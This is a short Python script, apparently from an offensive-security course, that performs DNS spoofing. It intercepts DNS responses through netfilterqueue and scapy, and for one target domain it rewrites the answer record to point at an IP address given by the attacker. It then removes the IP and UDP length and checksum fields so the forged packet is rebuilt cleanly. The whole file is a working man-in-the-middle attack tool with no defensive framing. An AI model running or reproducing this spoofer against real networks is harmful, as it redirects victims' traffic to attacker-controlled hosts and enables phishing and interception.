#!/usr/bin/env python3

import netfilterqueue 
import scapy.all as scapy
import signal
import sys
from termcolor import colored

def get_arguments():
    if len(sys.argv) != 2:
        print(colored("[!] Usage: python3 dns_spoofer.py <ip_host>", 'red'))
        sys.exit(1)
    return sys.argv[1]

def def_handler(signal, frame):
    print(colored("\n[!] Closing program...\n", 'red'))
    sys.exit(0)
    
signal.signal(signal.SIGINT, def_handler)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR): # DNS Question Record
        qname = scapy_packet[scapy.DNSQR].qname
        print(qname)
        
        if b"www.noestoyactivo.com" in qname:
            
            print(colored(f"[+] Envenenando el dominio: {qname}", 'green'))
            # debemos controlar los campos rrname y rdata para que coincidan con los de la petición original
            # viene de la seccion answer
            answer = scapy.DNSRR(rrname=qname, rdata=ip_host)
            scapy_packet[scapy.DNS].an = answer # Modification of the answer field in the DNS layer; payload
            scapy_packet[scapy.DNS].ancount = 1 # Modification of the answer count field in the DNS layer; payload
            
            
            # Eliminamos los campos de control de la capa IP y de la capa Ethernet
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            # Eliminamos los campos de control de la capa UDP si existen
            if scapy_packet.haslayer(scapy.UDP):
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum
            
            packet.set_payload(scapy_packet.build())
            
    
    packet.accept() 

def main():
    
    global ip_host 
    ip_host = get_arguments()

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
    
if __name__ == '__main__':
    main()
